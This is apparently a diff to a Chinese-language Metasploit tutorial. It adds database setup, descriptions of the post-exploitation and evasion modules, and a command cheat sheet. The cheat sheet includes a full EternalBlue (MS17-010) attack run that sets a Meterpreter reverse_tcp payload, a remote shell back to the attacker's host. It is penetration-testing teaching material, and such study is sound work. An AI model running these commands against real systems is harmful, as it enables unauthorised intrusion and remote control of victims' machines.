@@ -18,8 +18,19 @@
 ## 0x02 Metasploit Framework
 > Metasploit的版本之一, 默认集成在Kali中
 
-- 使用postgresql数据库进行数据的存储.
-  > 早期版本需要先启动数据库再启动msf，现代 Kali 已自动配置
+- 使用 PostgreSQL 数据库进行数据存储
+  > 现代 Kali 中已预配置数据库，首次使用时初始化即可：
+
+```shell
+# 初始化数据库（只需执行一次）
+sudo msfdb init
+
+# 启动 msfconsole
+msfconsole
+
+# 在 msf 中检查数据库连接
+msf6 > db_status
+```
 
 ```mermaid
 flowchart TB
@@ -88,3 +99,42 @@ Ruby扩展库是框架的基本组件，它包含各种可以由底层或其他�
 
 ##### 辅助模块
 辅助模块为信息检索提供各种扫描程序。其中包括登录扫描器、漏洞扫描器、网络嗅探和端口扫描器。
+
+##### 后渗透模块 (Post)
+
+用于在获取目标系统 session 后执行进一步操作：信息收集、提权、持久化、横向移动等。
+
+##### 规避模块 (Evasion)
+
+Metasploit 5+ 引入的模块类型，用于生成能绕过安全防护的载荷。
+
+## 0x03 常用命令速查
+
+```
+# 搜索模块
+msf6 > search type:exploit platform:windows smb
+msf6 > search cve:2021-44228    # 按 CVE 编号搜索
+
+# 使用模块
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > show options
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
+msf6 exploit(ms17_010_eternalblue) > exploit
+
+# 工作区管理（多目标测试时有用）
+msf6 > workspace -a project1    # 创建工作区
+msf6 > workspace project1       # 切换工作区
+msf6 > workspace -l             # 列出所有工作区
+
+# 数据库查询
+msf6 > hosts                    # 查看已发现主机
+msf6 > services                 # 查看已发现服务
+msf6 > vulns                    # 查看已发现漏洞
+msf6 > creds                    # 查看已获取凭据
+
+# Session 管理
+msf6 > sessions -l              # 列出所有 session
+msf6 > sessions -i 1            # 进入 session 1
+```
